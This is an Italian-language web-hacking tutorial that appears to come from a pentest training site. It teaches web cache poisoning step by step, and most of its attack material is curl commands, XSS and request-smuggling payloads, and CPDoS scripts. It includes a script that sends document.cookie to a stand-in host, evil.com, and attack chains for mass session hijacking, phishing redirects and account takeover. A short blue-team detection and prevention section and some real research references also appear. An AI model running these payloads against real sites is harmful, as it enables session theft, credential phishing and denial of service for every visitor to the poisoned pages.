---
title: 'Web Cache Poisoning: Cos''è, Come Funziona e Come Sfruttarlo'
slug: cache-poisoning
description: >+
  Guida completa al web cache poisoning: scopri cos'è, come funziona il cache
  poisoning, tecniche di exploitation (unkeyed inputs, CPDoS) e come
  trasformarlo in account takeover. Esempi pratici e CDN-specific.

image: /web-cache-poisoning.webp
draft: false
date: 2026-06-04T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - web cache poisoning
  - cache key injection
  - CPDoS
  - Param Miner
  - unkeyed input
---

# Web Cache Poisoning: Guida Completa da Zero all'Account Takeover

Il **web cache poisoning** è un attacco in cui forzi la cache di un sito a servire una risposta malevola a tutti gli utenti che visitano una determinata URL. Non stai attaccando una persona — stai attaccando l'infrastruttura. Una volta avvelenata, la cache distribuisce il tuo payload in automatico a chiunque passi da quella pagina, per tutta la durata del TTL.

La differenza con una XSS stored classica: quella colpisce chi visita una pagina specifica. Il cache poisoning colpisce chiunque visiti qualsiasi pagina cachata — homepage, asset globali, API di configurazione. Con i grandi CDN si parla di decine di migliaia di utenti per ogni ora di cache avvelenata.

La ricerca che ha definito le tecniche moderne è quella di James Kettle (PortSwigger), presentata a Black Hat 2018 con "Practical Web Cache Poisoning" e continuata nel 2020 con "Web Cache Entanglement". Prima di quel lavoro, la classe era nota ma considerata teorica. Kettle l'ha dimostrata su Unity3D, Mozilla e data.gov in produzione.

***

## Come Funziona: Il Concetto Base

Una cache HTTP salva le risposte e le riusa. Per decidere se due richieste vogliono la stessa risorsa, usa una **cache key** — di solito: metodo + host + path + query string.

Il problema: ci sono input che influenzano la risposta del backend ma **non fanno parte della cache key**. Si chiamano **unkeyed inputs**. Il backend li legge, ci costruisce sopra contenuto dinamico, e la cache salva quella risposta senza sapere che era "inquinata" dall'input dell'attaccante.

```
Attaccante:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com     ← non è nella cache key
                                 ma il backend lo usa per costruire gli URL

Backend risponde:
<script src="https://evil.com/bundle.js"></script>   ← URL costruito dall'header
                                                       ← cachata per tutti!

Utente normale (dopo):
GET / HTTP/1.1
Host: target.com               ← stessa cache key
→ riceve la risposta avvelenata con lo script di evil.com
```

Il meccanismo è questo: l'attaccante trova un input che non viene "visto" dalla cache ma viene usato dal backend. Lo usa per iniettare contenuto malevolo nella risposta. La risposta viene cachata. Tutti gli utenti successivi ricevono il payload.

***

## Evoluzione Storica

Vale la pena saperla perché la trovi nelle domande di colloquio e nei bug bounty writeup.

**2018 — Practical Web Cache Poisoning (Kettle, Black Hat USA):** prima metodologia sistematica. Dimostra attacchi su target reali di produzione usando header non validati come unkeyed inputs.

**2019 — CPDoS (ricerca universitaria Colonia/Amburgo):** introduce tre varianti di cache poisoning per Denial of Service — HHO, HMC, HMO. Una singola request sufficiente a rendere un endpoint irraggiungibile per la durata del TTL.

**2020 — Web Cache Entanglement (Kettle, Black Hat USA):** dimostra che anche i componenti "keyed" (Host header, path) possono essere usati in attacchi se cache e backend li parsano in modo diverso. Nascono i concetti di cache oracle e cache key injection. Vulnerabilità trovate su Cloudflare, Fastly, Akamai.

**2024 — Gotta Cache 'Em All (Kettle, DEF CON/Black Hat):** path confusion e normalizzazione del path come vettori per avvelenare risorse ad altissimo traffico usando URL che normalmente non verrebbero mai visitate.

***

## Step 1 — Identifica la Cache e Chi la Gestisce

Prima di tutto, devi capire se c'è una cache attiva e chi la controlla. Ogni CDN lascia tracce diverse negli header di risposta.

```bash
curl -sI "https://target.com/" | grep -iE "x-cache|cf-cache|age|x-varnish|x-amz|via|x-served-by|x-fastly"
```

Leggi così:

```
CF-Cache-Status: HIT     → Cloudflare, risposta dalla cache
cf-ray: 7a1b2c3-MXP     → Cloudflare, PoP di Milano

X-Cache: TCP_HIT from a12-34-56-78.akamaitechnologies.com  → Akamai
X-Check-Cacheable: YES  → Akamai, risposta cachabile

X-Cache: HIT, HIT        → Fastly (due hop di cache)
X-Served-By: cache-mxp6932-MXP  → Fastly, PoP di Milano

X-Amz-Cf-Pop: MXP53-P1  → CloudFront (AWS)
Via: 1.1 abc123.cloudfront.net (CloudFront)

X-Varnish: 123456 789012 → Varnish, due ID = cache HIT (un ID solo = MISS)
```

Se non vedi nessuno di questi, fai la stessa request due volte e guarda se il valore di `Age` cambia o se la latenza crolla. Differenza di 200ms+ = cache attiva.

Il **TTL** lo leggi da `Cache-Control: max-age=3600` (secondi). Più è alto, più a lungo dura il tuo attacco dopo l'avvelenamento.

***

## Step 2 — Cache Oracle: Trova un Punto di Osservazione

Prima di cercare vulnerabilità, hai bisogno di un **cache oracle**: un endpoint che ti dice con certezza se sei in HIT o MISS, e che riflette parte degli input nella risposta. È il tuo strumento di misura.

```bash
# Fai la stessa request due volte — se la seconda è HIT, l'endpoint è cachato
curl -sI "https://target.com/" | grep -iE "x-cache|cf-cache-status|age"
# Prima:  X-Cache: MISS  (va al backend)
# Seconda: X-Cache: HIT  (viene dalla cache)
# → Trovato il tuo oracle
```

**Usa sempre un cache buster durante la ricognizione.** Aggiunge un parametro univoco alla query string così la cache tratta ogni tua request come nuova, senza rischiare di avvelenare utenti reali:

```bash
curl -sI "https://target.com/?cb=$(date +%s)" | grep -iE "x-cache|cf-cache"
# Ogni request ha una cache key diversa → nessun rischio di poisoning accidentale
# Rimuovi cb= SOLO quando vuoi avvelenare deliberatamente
```

***

## Step 3 — Trova gli Unkeyed Inputs

Adesso cerchi input che non fanno parte della cache key ma che il backend usa per costruire la risposta. Il tool più efficace è **Param Miner** (BApp gratuita per Burp Suite): invia centinaia di header nascosti in automatico e segnala quelli che cambiano la risposta.

In alternativa, testa manualmente questi header — sono quelli che compaiono più spesso nei bug bounty:

```bash
# X-Forwarded-Host — il più classico
curl -s "https://target.com/?cb=1" -H "X-Forwarded-Host: CANARY123" | grep "CANARY123"
# Se CANARY123 compare nella risposta → X-Forwarded-Host è unkeyed e riflesso
```

```bash
# X-Forwarded-Scheme — usato per costruire redirect HTTP→HTTPS
curl -sI "https://target.com/?cb=2" -H "X-Forwarded-Scheme: http" -H "X-Forwarded-Host: CANARY123"
# Se risponde con 301 Location: http://CANARY123/ → unkeyed e riflesso nel redirect
```

```bash
# X-Host, X-Forwarded-Port, X-Original-URL
curl -s "https://target.com/?cb=3" -H "X-Host: CANARY123" | grep "CANARY123"
curl -s "https://target.com/?cb=4" -H "X-Forwarded-Port: 9999" | grep "9999"
curl -s "https://target.com/?cb=5" -H "X-Original-URL: /CANARY123" | grep "CANARY123"
```

```bash
# X-HTTP-Method-Override — usato per CPDoS (spiegato dopo)
curl -sI "https://target.com/?cb=6" -H "X-HTTP-Method-Override: DELETE" | head -3
# HTTP/1.1 405 Method Not Allowed → il backend risponde all'override
# Se questo errore viene cachato → DoS su tutti gli utenti
```

Il test vale se: il valore che hai messo nell'header compare nella risposta HTML (in un `src=`, `href=`, `canonical`, `action=`, `Location`) **e** la risposta viene cachata.

***

## Step 4 — Avvelena la Cache

Una volta trovato un unkeyed input che viene riflesso, il flusso è sempre questo:

```
1. Request con payload + cache buster (MISS → risposta avvelenata, non cachata)
   → Verifica che il payload sia nella risposta

2. Request con payload SENZA cache buster (MISS → risposta avvelenata cachata)

3. Request SENZA payload SENZA cache buster (HIT → ricevi la risposta avvelenata?)
   → SÌ = cache avvelenata con successo
```

Esempio completo con X-Forwarded-Host:

```bash
# Step 1: verifica che l'input sia riflesso
curl -s "https://target.com/?cb=TEST123" \
  -H "X-Forwarded-Host: evil.com" | grep "evil.com"
# Output: <script src="https://evil.com/static/bundle.js"></script>
# → Riflesso nella risposta ✓

# Step 2: avvelena la cache (senza cache buster)
curl -s "https://target.com/" \
  -H "X-Forwarded-Host: evil.com" -o /dev/null

# Step 3: verifica — request pulita, risposta avvelenata?
curl -s "https://target.com/" | grep "evil.com"
# → Output: <script src="https://evil.com/static/bundle.js"></script>
# → Cache avvelenata ✓ — tutti gli utenti eseguono JS da evil.com
```

***

## Tecniche di Exploitation

### X-Forwarded-Host → JavaScript Injection

Il vettore più diffuso. L'applicazione usa `X-Forwarded-Host` per costruire URL degli asset (CDN, static files). Se la cache non include quell'header nella key, la risposta con lo script malevolo viene cachata per tutti.

```bash
curl -s "https://target.com/" -H "X-Forwarded-Host: evil.com" | \
  grep -iE "src=|href=|canonical"
# <link rel="canonical" href="https://evil.com/">
# <script src="https://evil.com/static/bundle.js"></script>
```

Sul server evil.com configura `bundle.js` per rubare sessioni:

```javascript
// evil.com/static/bundle.js
fetch('https://evil.com/collect?c=' + document.cookie);
```

Avveleni la homepage → tutti gli utenti che la visitano eseguono quel JS → sessioni rubate in automatico per tutto il TTL.

### X-Forwarded-Scheme → Redirect Cachato

Se l'applicazione reindirizza HTTP→HTTPS e usa `X-Forwarded-Scheme` per determinare il protocollo corrente, puoi farle generare un redirect verso evil.com che viene cachato:

```bash
curl -sI "https://target.com/" \
  -H "X-Forwarded-Scheme: http" \
  -H "X-Forwarded-Host: evil.com"
# HTTP/1.1 301 Moved Permanently
# Location: https://evil.com/
```

Se il 301 viene cachato, ogni utente che visita `target.com` viene reindirizzato automaticamente a evil.com fino alla scadenza del TTL.

### Query Parameter Normalization → XSS Cachato

Alcune cache normalizzano la query string in modo diverso dal backend, oppure ignorano certi parametri. Se il backend riflette un parametro che la cache ignora, ottieni una XSS cachata senza header speciali.

```bash
# La cache ignora il parametro "evil" ma il backend lo riflette nella risposta
curl -s "https://target.com/?evil=<script>alert(1)</script>" | grep "evil"
# <p>Risultati per: <script>alert(1)</script></p>

# Verifica: la risposta viene cachata per /?
curl -sI "https://target.com/?evil=X" | grep -i cache
# X-Cache: HIT → sì, la key è solo / senza parametri → XSS persistente
```

### Fat GET → Body Ignorato dalla Cache

Alcune cache ignorano il body delle richieste GET (non fa parte della cache key), ma il backend lo legge e lo usa per costruire la risposta:

```bash
curl -X GET "https://target.com/api/translate" \
  -H "Content-Type: application/json" \
  -d '{"text":"<script>alert(document.cookie)</script>","lang":"en"}'
# Se il backend usa il body per generare la risposta
# e la cache ignora il body nella key:
# → Response con XSS cachata per tutti gli utenti di /api/translate
```

### Cache Key Injection — Port

Tecnica da Web Cache Entanglement. Se la cache non include il port nella key ma il backend lo usa per costruire URL nella risposta, puoi avvelenare con un port che non risponde → DoS cachato in una sola request.

```bash
curl -sI "https://target.com/" -H "Host: target.com:9999"
# Se la risposta è HIT (stessa cache key di target.com) → port non è nella key
# Se il backend genera: Location: https://target.com:9999/
# → Redirect verso port inesistente → timeout per tutti gli utenti
# Kettle ha dimostrato questa tecnica su Cloudflare e Fastly (poi patchati)
```

### Cache Key Injection — Path Normalization

Alcune cache normalizzano il path prima di costruire la key (rimuovono `../`, decodificano `%2F`), ma il backend riceve il path originale. Questa discrepanza permette di avvelenare endpoint ad alto traffico usando URL che normalmente nessuno visita.

```bash
# La cache normalizza /static/..%2Fhomepage a /homepage nella key
# Il backend riceve /static/../homepage e serve /homepage
curl "https://target.com/static/..%2Fhomepage" \
  -H "X-Forwarded-Host: evil.com"
# Se la risposta contiene evil.com ed è cachata per /homepage
# → Homepage avvelenata per tutti gli utenti
```

***

## DOM Cache Poisoning

Variante meno ovvia: il payload non va nell'HTML del server, ma in un JSON o script cachato che il frontend usa per costruire il DOM lato client.

```bash
# Cerca endpoint di configurazione/inizializzazione cachati
curl -sI "https://target.com/api/config" | grep -i cache
# Cache-Control: max-age=300 → cachato

# Test: l'API usa X-Forwarded-Host per costruire URL?
curl -s "https://target.com/api/config" \
  -H "X-Forwarded-Host: evil.com" | python3 -m json.tool
# {
#   "cdn_url": "https://evil.com/static/",
#   "api_base": "https://evil.com/api"
# }
```

Se il frontend fa `<script src="${config.cdn_url}bundle.js">`, avvelenare `/api/config` equivale ad avvelenare l'intera applicazione — ogni pagina che carica quella configurazione esegue JS da evil.com. Gli endpoint da cercare: `/api/init`, `/api/config`, `/api/settings`, `manifest.json`, `runtime.js`.

***

## Attack Chains

### + XSS → Mass Session Hijacking

```
X-Forwarded-Host: evil.com
→ <script src="https://evil.com/bundle.js"> cachato
→ TTL 1 ora, homepage 50.000 visite/ora
→ 50.000 utenti eseguono bundle.js → document.cookie inviato a evil.com
→ 50.000 sessioni rubate
```

### + Open Redirect → Phishing di Massa

```
X-Forwarded-Scheme: http + X-Forwarded-Host: evil.com
→ 301 Location: https://evil.com/ cachato
→ Ogni utente che visita target.com → reindirizzato a evil.com
→ Pagina di login falsa → credenziali catturate
```

### + Password Reset → Account Takeover

L'applicazione genera il link di reset usando il Host header. Se la risposta con il link viene cachata, tutti gli utenti ricevono link che puntano a evil.com:

```bash
curl -s "https://target.com/api/invite" \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@company.com"}'
# Response: {"invite_url": "https://evil.com/accept?token=..."}
# → Cachata → tutti i link di invito puntano a evil.com → token rubati
```

Vedi anche: [password-reset-attack](https://hackita.it/articoli/password-reset-attack), [account-takeover](https://hackita.it/articoli/account-takeover).

### + Request Smuggling → Poisoning Invisibile

Il request smuggling permette di "prefixare" la request della vittima con contenuto controllato dall'attaccante. Il risultato: la cache salva una risposta avvelenata senza che l'attaccante abbia mai fatto una request diretta all'endpoint protetto.

```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 75

0

GET /static/bundle.js HTTP/1.1
X-Forwarded-Host: evil.com
Foo: bar
```

La request "smugglata" viene processata come se arrivasse da un client legittimo → la cache salva la risposta con `X-Forwarded-Host: evil.com`. Nessun header anomalo nelle request dell'attaccante visibili nei log. Vedi: [http-request-smuggling](https://hackita.it/articoli/http-request-smuggling).

***

## CPDoS: Cache Poisoned Denial of Service

Categoria separata: l'obiettivo non è XSS o ATO, ma rendere un endpoint irraggiungibile cachando una risposta di errore. Una singola request → DoS senza flood di traffico, nessun rate limiting triggerato.

### HHO — HTTP Header Oversize

La cache accetta header più grandi di quelli che il backend tollera. Mandi un header oversize → il backend risponde 400 → la cache caches il 400 → tutti ricevono 400.

```bash
python3 - << 'EOF'
import requests
# Header di 10KB → accettato dalla CDN, rifiutato dal backend
headers = {"X-Oversized-Header": "A" * 10000}
r = requests.get("https://target.com/", headers=headers)
print(r.status_code)  # 400 = backend ha rifiutato
EOF

# Verifica: request normale → risponde con 400 dalla cache?
curl -sI "https://target.com/" | head -3
# HTTP/1.1 400 Bad Request → DoS confermato
```

### HMC — HTTP Meta Character

Invece dell'header oversize, inserisci un carattere di controllo (`\n`, `\r`) che il backend non tollera ma la cache accetta:

```bash
# \n nell'header → backend risponde 400 → cachato
curl -sI "https://target.com/" \
  -H "$(printf 'X-Bad: test\r\n injection')"
# Se risponde 400 e poi la request pulita risponde 400 dalla cache → DoS
```

### HMO — HTTP Method Override

Molti framework supportano `X-HTTP-Method-Override` per simulare PUT/DELETE via GET/POST. Se il backend risponde 405 su un metodo non supportato e la cache lo caches:

```bash
curl -sI "https://target.com/" \
  -H "X-HTTP-Method-Override: DELETE"
# HTTP/1.1 405 Method Not Allowed

# CDN che cachano il 405: Akamai, CloudFront in alcune configurazioni
# → Tutti gli utenti ricevono 405 → DoS
```

***

## CDN Specifici: Differenze Operative

Non tutti i CDN si comportano allo stesso modo. Conoscere i default ti evita di perdere tempo su vettori che non funzionano su quella configurazione.

**Cloudflare:** cache key di default = scheme + host + path + query string. Header non inclusi. Caches per estensione file (.js, .css, .png). `CF-Cache-Status: BYPASS` significa che la risposta non viene mai cachata (es. presenza di cookie di sessione). Il PoP è identificato da `cf-ray`.

**Akamai:** simile, ma l'header `X-True-Cache-Key` nelle risposte mostra la cache key reale — è una miniera di informazioni. Le configurazioni Surrogate-Control possono sovrascrivere Cache-Control.

**Fastly:** usa VCL (Varnish Configuration Language) configurabile → i default variano molto da deployment a deployment. `X-Served-By` mostra il PoP specifico. Avvelenare un PoP non avvelena gli altri.

**CloudFront:** `Cache Policies` esplicite → verifica se il deployment usa le legacy settings (meno sicure). Lambda\@Edge può modificare la cache key a livello di codice — cerca funzioni Edge che gestiscono header.

**Varnish:** `X-Varnish` con due ID = HIT, un ID = MISS. Configurazione VCL custom → i default dipendono da chi ha scritto il VCL. Storicamente vulnerabile al capitalized Host header attack (poi patchato).

***

## Casi Reali

**Unity3D (2018):** usava `X-Forwarded-Host` per costruire gli URL degli asset JS. Cloudflare non includeva quell'header nella cache key. Con `X-Forwarded-Host: evil.com` → `<script src="https://evil.com/bundle.js">` cachato per 1 ora. Con 2 milioni di visite/giorno → \~83.000 utenti/ora colpiti da una singola request dell'attaccante.

**Mozilla (2018):** parametro query non incluso nella cache key ma riflesso senza encoding nella risposta HTML. Kettle ha cachato una XSS sulla homepage.

**Cloudflare/Fastly port key (2020):** nessuno dei due includeva il port nella cache key. Con `Host: target.com:1` (port irraggiungibile) → la risposta di errore veniva cachata → DoS sulla homepage con una request. Entrambi hanno patchato dopo la segnalazione.

**Bug bounty payout:** Kettle riporta di aver ricevuto sia $0 che $10,000 per vulnerabilità DoS via cache poisoning sulla stessa classe. La differenza: PoC con impatto misurabile (endpoint critico, traffico alto, TTL lungo) vs. segnalazione teorica.

***

## Detection Lato Blue Team

Cosa monitorare nei log e nel WAF:

```bash
# Nginx: logga il valore degli header sospetti
log_format poison '$remote_addr [$time_local] "$request" '
                  '$status fwd-host:"$http_x_forwarded_host" '
                  'fwd-scheme:"$http_x_forwarded_scheme"';

# Alert: X-Forwarded-Host diverso dal dominio principale + risposta 200
# Alert: header oversize (>8KB per header singolo) + risposta 400 cachata
# Alert: X-HTTP-Method-Override + risposta 4xx cachata
```

Per rilevare se sei già stato avvelenato, scraper periodico sulle pagine chiave:

```bash
#!/bin/bash
RESPONSE=$(curl -s "https://target.com/")
if echo "$RESPONSE" | grep -v "target.com" | grep -iE "src=https://|href=https://" > /dev/null; then
    echo "ALERT: domini esterni rilevati nella risposta cachata"
fi
```

Se trovi un avvelenamento attivo: invalida la cache immediatamente (Cloudflare → Purge Everything, Fastly → PURGE API, CloudFront → Invalidation).

***

## Errori Comuni

**Non usare il cache buster durante la ricognizione.** Se avveleni la cache mentre stai testando, colpisci utenti reali. Sempre `?cb=VALORE` durante la discovery.

**Testare solo la homepage.** Spesso è la più protetta. Cerca su endpoint API (`/api/config`, `/api/init`), pagine di errore, redirect endpoint, manifest file.

**Non verificare che la risposta sia effettivamente cachata.** Un unkeyed input che compare nella risposta non basta — devi confermare che la risposta poi viene servita da cache senza il tuo header (HIT).

**Ignorare le risposte di errore.** Un 400 o 405 cachato è un finding CPDoS valido. Non cercare solo XSS.

**Confondere cache poisoning e cache deception.** Cache poisoning: avveleni la cache → tutti ricevono il payload. Cache deception: fai cachare dati privati di un utente vittima → li leggi tu. Stesso layer, obiettivo opposto.

**Avvelenare un solo PoP CDN su CDN distribuiti.** Con Fastly e Cloudflare ogni PoP ha la sua cache. Avvelenare Milano non avvelena Londra.

***

## Checklist

```
PRE-TEST
☐ Cache buster configurato
☐ Param Miner installato su Burp
☐ Scope con cliente: ok avvelenare?

DISCOVERY
☐ Cache identificata (header X-Cache, CF-Cache-Status, Age, X-Varnish)
☐ CDN/proxy identificato (Cloudflare, Akamai, Fastly, CloudFront, Varnish)
☐ Cache oracle trovato (endpoint cachabile con HIT/MISS leggibile)
☐ TTL determinato (Cache-Control max-age)

UNKEYED INPUT HUNTING
☐ X-Forwarded-Host → compare nella risposta? (link, script, canonical)
☐ X-Forwarded-Scheme → genera redirect?
☐ X-Forwarded-Port → influenza URL nella risposta?
☐ X-Host, X-Original-URL → alternative testate
☐ Parametri query riflessi ma non nella cache key?
☐ Fat GET: body ignorato dalla cache ma letto dal backend?
☐ Port injection (Host: target.com:PORT)?
☐ Path normalization (%2F, .., encoded chars)?

EXPLOITATION
☐ Risposta avvelenata cachata confermata (MISS → HIT con payload)
☐ Request pulita → HIT con payload → POISONED
☐ Payload: JS injection, redirect, DoS

CPDoS
☐ HHO: header oversize (10KB+) → risposta 400 cachata?
☐ HMC: \n o \r negli header → risposta 4xx cachata?
☐ HMO: X-HTTP-Method-Override: DELETE → risposta 405 cachata?

DOCUMENTAZIONE
☐ Screenshot MISS con payload → HIT senza header
☐ TTL calcolato
☐ Stima utenti colpiti (visite/ora × TTL)
☐ Tipo impatto: XSS / redirect / ATO / DoS
```

***

## FAQ

**Devo essere autenticato per exploitare il cache poisoning?**
No. La maggior parte degli attacchi funziona su endpoint pubblici. È uno dei motivi per cui è così pericoloso.

**Serve Burp Suite Pro per Param Miner?**
No. Param Miner è una BApp gratuita, funziona con Burp Community Edition.

**Il cache poisoning funziona su HTTPS?**
Sì. Il caching avviene dopo la terminazione TLS. Cloudflare, Akamai, Fastly terminano TLS e poi cachano la risposta HTTP in chiaro. HTTPS non protegge da questo attacco.

**Quanto dura l'attacco?**
Esattamente il TTL. `max-age=3600` → 1 ora. Poi la cache scade e il backend serve una risposta pulita. Per mantenere l'attacco attivo devi riavvelenare periodicamente.

**Cache poisoning vs cache deception?**
Poisoning: servi contenuto malevolo agli altri. Deception: fai cachare dati privati di un utente, poi li leggi. Tecnica diversa, stesso layer vulnerabile.

**Come prevengo il cache poisoning?**
Non usare header client-controllabili (`X-Forwarded-*`) per generare contenuto dinamico. Se li usi, aggiungili alla cache key con `Vary: X-Forwarded-Host`. Configura il CDN per strippare header non necessari prima del forward al backend. Non cachare risposte 4xx.

***

## Risorse

* [PortSwigger Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [Practical Web Cache Poisoning — James Kettle](https://portswigger.net/research/practical-web-cache-poisoning)
* [Web Cache Entanglement — James Kettle](https://portswigger.net/research/web-cache-entanglement)
* [Gotta Cache 'Em All — PortSwigger Research](https://portswigger.net/research/gotta-cache-em-all)
* [CPDoS.org](https://cpdos.org/)

***

> Il tuo CDN include `X-Forwarded-Host` nella cache key? Un header anomalo può rendere la tua homepage irraggiungibile per un'ora con una sola request. [Penetration test HackIta](https://hackita.it/servizi). [Formazione 1:1](https://hackita.it/formazione).
